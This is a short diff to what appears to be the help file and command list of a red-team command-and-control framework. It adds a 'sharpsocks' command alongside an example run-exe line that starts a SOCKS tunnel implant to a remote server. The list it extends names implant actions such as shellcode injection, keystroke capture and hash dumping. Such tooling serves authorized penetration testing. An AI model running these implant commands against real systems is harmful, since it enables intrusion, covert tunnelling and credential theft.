@@ -119,6 +119,7 @@ sharpview Find-InterestingDomainShareFile -ComputerName SERVER01
 
 Socks:
 ======
+sharpsocks
 run-exe SharpSocksImplantTestApp.Program SharpSocks -url1 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -url2 /Barbara-Anne/Julissa/Moll/Jolie/Tiphany/Jessa/Letitia -c raFAdgVujTHBwcvMuRFYgKHqp -k fFaKiMspoTWHPbu3PvUNvpzTkuq+VKDp+h1X79q3gXQ= -s https://10.10.10.1 -b 5000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken
 
 Bloodhound:
@@ -458,4 +459,4 @@ SHARPCOMMANDS = ["get-userinfo","stop-keystrokes","get-keystrokes","delete","mov
 "testlocalcredential","get-screenshot","modulesloaded","get-serviceperms","unhide-implant","arpscan","ls","pwd","dir",
 "inject-shellcode","start-process","run-exe","run-dll","hide-implant","help","searchhelp","listmodules","loadmodule",
 "loadmoduleforce","back","ps","beacon","setbeacon","kill-implant","get-screenshotmulti", "safetydump", "seatbelt", "sharpup",
-"sharphound", "rubeus", "sharpview", "watson", "get-hash","migrate"]
+"sharphound", "rubeus", "sharpview", "watson", "get-hash","migrate","sharpsocks"]
